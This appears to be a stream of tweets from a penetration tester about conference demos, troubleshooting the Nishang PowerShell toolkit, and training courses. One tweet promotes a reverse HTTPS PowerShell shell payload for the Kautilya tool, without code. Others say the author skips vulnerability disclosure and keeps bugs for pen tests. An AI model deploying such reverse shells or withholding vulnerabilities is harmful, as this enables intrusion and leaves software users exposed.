Don't know if it is the pressure to perform which makes speakers go for a video demo. For me, a video only demo is equal to more slides.
Keeping video demo backups is suggested by many but I have seen speakers just giving up on live demos if they have a recording!
Having said that, there has not been a single talk by me where at least one of my demos didn't fail. Perils of live demos.
I prefer Live demos. A successful one means the things you spoke of actually work. Also, the level of satisfaction after a live demo is high

@subTee The client part of the script is so small, it fits into anything.
@subTee Saw that and it looks great.
Invoke-PoshRatHttps (courtesy @subTee ) is my favorite payload for #Kautliya. An interactive reverse https PowerShell session in &lt; 10 secs.

https://t.co/K4gEqRPNZt
@gregkcarson Could be a PowerShellv2 problem. I tested it on a PowerShellv3 and Office 2013 machine right now.
@gregkcarson Are you using the latest version of Nishang? What is the PowerShell version and Office version on the computer?
RT @sonaliranade: Democracy has been absolutely negated in Delhi without a whimper of protest from society at large.  #AAP

So much of PowerShell goodness at BH/Bsides/Defcon this year. Already time stressed PowerShell for Pentesters will be a 3 day course now :D

@anantshri My disclosure "ideology" applies only to commercial software. @CodeVigilant
@anantshri Agree. Most of them are just peanuts. @CodeVigilant is a great initiative.
@anantshri Even without a bug bounty? That's generous of you :P
And its not worth the legal risk either. I like to sit on the bugs and sparingly use them in my trainings/pen tests.
If it is of interest to anyone, I don't do any kind (responsible/full/coordinated/whatever) disclosure. For me, its just not worth the time.
